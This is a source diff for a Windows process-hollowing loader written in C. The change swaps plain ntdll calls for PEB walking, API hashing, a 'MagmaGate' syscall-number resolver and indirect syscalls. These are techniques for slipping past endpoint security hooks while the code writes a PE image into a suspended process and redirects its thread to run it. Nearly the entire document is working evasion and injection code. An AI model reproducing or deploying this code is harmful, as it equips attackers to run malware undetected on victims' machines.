@@ -1,32 +1,5 @@
 #include "Box.h"
 
-VOID IDSC
-(
-	IN HMODULE ntdll,
-	IN LPCSTR NtApi,
-	OUT PDWORD FuncSSN,
-	OUT PUINT_PTR FuncSyscall
-)
-{
-
-	if (!FuncSSN || !FuncSyscall)
-		return;
-
-	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
-	if (!NtFunction)
-	{
-		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
-		return;
-	}
-
-
-	*FuncSyscall = NtFunction + 0x12;
-	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];
-
-	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);
-
-}
-
 BOOL CreateSuspendedProcess
 (
 	IN LPCSTR ProcessName,
@@ -88,14 +61,18 @@ BOOL ReadTargetFile
 	NTSTATUS status = NULL;
 	FILE_STANDARD_INFORMATION fsi;
 	IO_STATUS_BLOCK iosb = { 0 };
+	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
+	SYSCALL_INFO info = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
 
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	if (ntdll == NULL)
+	HMODULE ntdll = WalkPeb();
+	if (!ntdll)
 	{
-		PRINT_ERROR("GetModuleHandleA");
-		return FALSE;
+		PRINT_ERROR("WalkPeb");
+		return 1;
 	}
-	INFO("[0x%p] Current Ntdll Handle", ntdll);
+
+	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
 	RtlInitUnicodeString g_RtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
 
@@ -113,11 +90,38 @@ BOOL ReadTargetFile
 		NULL
 	);
 
-	IDSC(ntdll, "NtCreateFile", &fn_NtCreateFileSSN, &fn_NtCreateFileSyscall);
-	IDSC(ntdll, "NtQueryInformationFile", &fn_NtQueryInformationFileSSN, &fn_NtQueryInformationFileSyscall);
-	IDSC(ntdll, "NtReadFile", &fn_NtReadFileSSN, &fn_NtReadFileSyscall);
+	if (!GetEAT(ntdll, &pImgDir))
+	{
+		PRINT_ERROR("GetEAT");
+		return 1;
+	}
 
-	status = NtCreateFile(&hFile, GENERIC_READ | SYNCHRONIZE, &OA, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0);
+	const CHAR* Functions[] =
+	{
+		"NtCreateFile",
+		"NtQueryInformationFile",
+		"NtReadFile"
+	};
+
+	size_t FuncSize = ARRAYSIZE(Functions);
+
+	for (size_t i = 0; i < FuncSize; i++)
+	{
+		DWORD apiHash = GetBaseHash(
+			Functions[i],
+			ntdll,
+			pImgDir
+		);
+
+		MagmaGate(pImgDir, ntdll, apiHash, &info);
+
+		syscallInfos[i].SSN = info.SSN;
+		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
+	}
+
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateFile
+	status = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG))SyscallInvoker)
+		(&hFile, GENERIC_READ | SYNCHRONIZE, &OA, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtCreateFile");
@@ -126,7 +130,9 @@ BOOL ReadTargetFile
 
 	INFO("[0x%p] Current File Handle", hFile);
 
-	status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtQueryInformationFile
+	status = ((NTSTATUS(*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS))SyscallInvoker)
+		(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtQueryInformationFile");
@@ -145,7 +151,9 @@ BOOL ReadTargetFile
 
 	INFO("[%ld] Allocated Bytes to Buffer", fileSize);
 
-	status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, lppBuffer, fileSize, NULL, NULL);
+	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtReadFile
+	status = ((NTSTATUS(*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG))SyscallInvoker)
+		(hFile, NULL, NULL, NULL, &iosb, lppBuffer, fileSize, NULL, NULL);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtReadFile");
@@ -223,23 +231,54 @@ BOOL HollowExec
 	DWORD dwProt = NULL;
 	SIZE_T lpNumOfBytesWritten = NULL;
 	NTSTATUS status = NULL;
+	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
+	SYSCALL_INFO info = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
 
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	if (ntdll == NULL)
+	HMODULE ntdll = WalkPeb();
+	if (!ntdll)
 	{
-		PRINT_ERROR("GetModuleHandleA");
-		return FALSE;
+		PRINT_ERROR("WalkPeb");
+		return 1;
 	}
-	INFO("[0x%p] Current Ntdll Handle", ntdll);
 
-	IDSC(ntdll, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
-	IDSC(ntdll, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
-	IDSC(ntdll, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
+	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
+
+	if (!GetEAT(ntdll, &pImgDir))
+	{
+		PRINT_ERROR("GetEAT");
+		return 1;
+	}
+
+	const CHAR* Functions[] =
+	{
+		"NtAllocateVirtualMemory",
+		"NtWriteVirtualMemory",
+		"NtProtectVirtualMemory"
+	};
+
+	size_t FuncSize = ARRAYSIZE(Functions);
+
+	for (size_t i = 0; i < FuncSize; i++)
+	{
+		DWORD apiHash = GetBaseHash(
+			Functions[i],
+			ntdll,
+			pImgDir
+		);
+
+		MagmaGate(pImgDir, ntdll, apiHash, &info);
+
+		syscallInfos[i].SSN = info.SSN;
+		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
+	}
 
 	SIZE_T regionSize = pImgNt->OptionalHeader.SizeOfImage;
 	PVOID  baseAddress = (PVOID)pImgNt->OptionalHeader.ImageBase;
 
-	status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
+	status = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
+		(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtAllocateVirtualMemory");
@@ -267,7 +306,9 @@ BOOL HollowExec
 		State = FALSE; goto CLEANUP;
 	}
 
-	status = NtWriteVirtualMemory(hProcess, baseAddress, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten);
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
+	status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
+		(hProcess, baseAddress, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtWriteVirtualMemory");
@@ -301,7 +342,9 @@ BOOL HollowExec
 
 		if (pImgSecHeader[i].SizeOfRawData) {
 
-			status = NtWriteVirtualMemory(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten);
+			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
+			status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
+				(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten);
 			if (!NT_SUCCESS(status))
 			{
 				NTERROR("NtWriteVirtualMemory");
@@ -310,7 +353,9 @@ BOOL HollowExec
 
 		}
 
-		status = NtProtectVirtualMemory(hProcess, &SecBaseAddress, &size, dwProt, &dwOldProt);
+		SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
+		status = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
+			(hProcess, &SecBaseAddress, &size, dwProt, &dwOldProt);
 		if (!NT_SUCCESS(status))
 		{
 			NTERROR("NtProtectVirtualMemory");
@@ -347,22 +392,52 @@ BOOL GetThreadCtx
 	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
 	ThreadCtx.ContextFlags = CONTEXT_FULL;
 	ULONG suspendedCount = 0;
+	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
+	SYSCALL_INFO info = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
 
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	if (ntdll == NULL)
+	HMODULE ntdll = WalkPeb();
+	if (!ntdll)
 	{
-		PRINT_ERROR("GetModuleHandleA");
-		return FALSE;
+		PRINT_ERROR("WalkPeb");
+		return 1;
 	}
-	INFO("[0x%p] Current Ntdll Handle", ntdll);
 
-	IDSC(ntdll, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
-	IDSC(ntdll, "NtGetContextThread", &fn_NtGetContextThreadSSN, &fn_NtGetContextThreadSyscall);
-	IDSC(ntdll, "NtSetContextThread", &fn_NtSetContextThreadSSN, &fn_NtSetContextThreadSyscall);
-	IDSC(ntdll, "NtResumeThread", &fn_NtResumeThreadSSN, &fn_NtResumeThreadSyscall);
-	IDSC(ntdll, "NtWaitForSingleObject", &fn_NtWaitForSingleObjectSSN, &fn_NtWaitForSingleObjectSyscall);
+	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
-	status = NtGetContextThread(hThread, &ThreadCtx);
+	if (!GetEAT(ntdll, &pImgDir))
+	{
+		PRINT_ERROR("GetEAT");
+		return 1;
+	}
+
+	const CHAR* Functions[] =
+	{
+		"NtGetContextThread",
+		"NtWriteVirtualMemory",
+		"NtResumeThread",
+		"NtWaitForSingleObject"
+	};
+
+	size_t FuncSize = ARRAYSIZE(Functions);
+
+	for (size_t i = 0; i < FuncSize; i++)
+	{
+		DWORD apiHash = GetBaseHash(
+			Functions[i],
+			ntdll,
+			pImgDir
+		);
+
+		MagmaGate(pImgDir, ntdll, apiHash, &info);
+
+		syscallInfos[i].SSN = info.SSN;
+		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
+	}
+
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtGetContextThread
+	status = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
+		(hThread, &ThreadCtx);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtGetContextThread");
@@ -395,7 +470,9 @@ BOOL GetThreadCtx
 		ThreadCtx.Rip
 	);
 
-	status = NtWriteVirtualMemory(hProcess, (PVOID)(ThreadCtx.Rdx + 0x10), &pImgNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
+	status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
+		(hProcess, (PVOID)(ThreadCtx.Rdx + 0x10), &pImgNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtWriteVirtualMemory");
@@ -421,7 +498,9 @@ BOOL GetThreadCtx
 
 	OKAY("[RCX] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rcx, rBuffer);
 
-	status = NtResumeThread(hThread, &suspendedCount);
+	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtResumeThread
+	status = ((NTSTATUS(*)(HANDLE, PULONG))SyscallInvoker)
+		(hThread, &suspendedCount);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtResumeThread");
@@ -430,7 +509,9 @@ BOOL GetThreadCtx
 
 	INFO("[0x%p] waiting for thread to finish execution...", hThread);
 
-	status = NtWaitForSingleObject(hThread, FALSE, NULL);
+	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
+	status = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
+		(hThread, FALSE, NULL);
 	if (!NT_SUCCESS(status))
 	{
 		NTERROR("NtWaitForSingleObject");
